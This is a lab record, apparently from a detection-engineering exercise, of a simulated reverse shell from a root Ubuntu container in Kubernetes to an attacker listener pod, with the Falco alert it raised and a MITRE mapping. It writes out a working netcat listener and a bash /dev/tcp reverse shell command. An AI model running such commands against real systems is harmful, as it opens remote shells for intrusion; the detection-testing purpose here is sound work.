# Attack 004: Reverse Shell From Kubernetes Container

## Objective
Simulate reverse shell behavior from a compromised Kubernetes workload container to an attacker-controlled listener pod.

## Listener Pod
- Namespace: de-attacker
- Pod: attacker-netshoot
- Port: 4444

## Source Pod
- Namespace: de-target
- Pod: admin-toolbox
- Image: ubuntu:22.04
- User: root

## Listener Command
kubectl exec -n de-attacker attacker-netshoot -- sh -c "rm -f /tmp/reverse-shell-listener.log; nohup nc -lvnp 4444 > /tmp/reverse-shell-listener.log 2>&1 & echo listener-started"

## Reverse Shell Command
kubectl exec -n de-target admin-toolbox -- bash -c "timeout 5 bash -c 'bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1' || true"

## Observed Result
The attacker listener received a connection from the target pod.

Observed listener output:
- Listening on 0.0.0.0 4444
- Connection received from 10.244.0.6
- Shell prompt observed from admin-toolbox

## Detection Result
Detected by Falco default rule.

## Falco Alert Summary
Falco generated alerts for stdout/stdin being redirected to a network connection.

Key observed fields:
- process: bash
- command: bash -c bash -i >& /dev/tcp/10.244.0.4/4444 0>&1
- connection: 10.244.0.6:54370->10.244.0.4:4444
- source pod: admin-toolbox
- source namespace: de-target
- source image: ubuntu:22.04

## MITRE ATT&CK Mapping
- Tactic: Command and Control
- Technique: T1059 - Command and Scripting Interpreter
- Related Behavior: Reverse shell / interactive command execution over TCP

## Evidence Files
- evidence/raw-telemetry/reverse-shell-attacker-ip.txt
- evidence/raw-telemetry/reverse-shell-listener-log.txt
- evidence/alerts/falco-after-reverse-shell.txt

## Detection Status
Covered by default Falco rule.

## False Positive Notes
Possible false positives may occur from legitimate debugging or remote administration activity where shell input/output is redirected over a network socket. In production, this should be rare and investigated quickly.
